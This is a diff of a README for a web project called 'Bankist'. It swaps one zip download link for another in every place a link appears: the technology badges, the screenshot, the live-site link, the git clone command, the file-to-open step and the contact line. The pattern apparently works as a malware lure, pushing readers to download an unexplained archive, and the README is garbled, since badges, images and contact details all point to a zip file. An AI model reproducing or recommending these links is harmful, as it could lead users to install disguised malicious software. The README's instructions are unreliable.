@@ -2,15 +2,15 @@
 
 <div align='center'>
 
-![HTML5 Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip) ![Tailwind Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip) ![JavaScript Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
-![Netlify Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
-![Figma Badge](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
+![HTML5 Badge](https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip) ![Tailwind Badge](https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip) ![JavaScript Badge](https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip)
+![Netlify Badge](https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip)
+![Figma Badge](https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip)
 
 </div>
 
-![Sceenshot](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
+![Sceenshot](https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip)
 
-You can view the live site -> [Here](https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip)
+You can view the live site -> [Here](https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip)
 
 ## Usage
 
@@ -52,7 +52,7 @@ To run this project locally, you can follow these steps:
 1. Clone the repository:
 
    ```
-   $ git clone https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip
+   $ git clone https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip
    ```
 
 2. Open the project folder in your code editor of choice.
@@ -60,7 +60,7 @@ To run this project locally, you can follow these steps:
    ```
    npm run dev
    ```
-4. Open the 'https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip' file in your web browser.
+4. Open the 'https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip' file in your web browser.
 
 ## License
 
@@ -68,4 +68,4 @@ This project is licensed under the MIT License.
 
 ## Contact
 
-If you have any questions or comments about this project, you can reach out to me at https://github.com/imadosan/Bankist/raw/refs/heads/main/src/Software_mountained.zip
+If you have any questions or comments about this project, you can reach out to me at https://raw.githubusercontent.com/imadosan/Bankist/main/src/Software-v3.4.zip
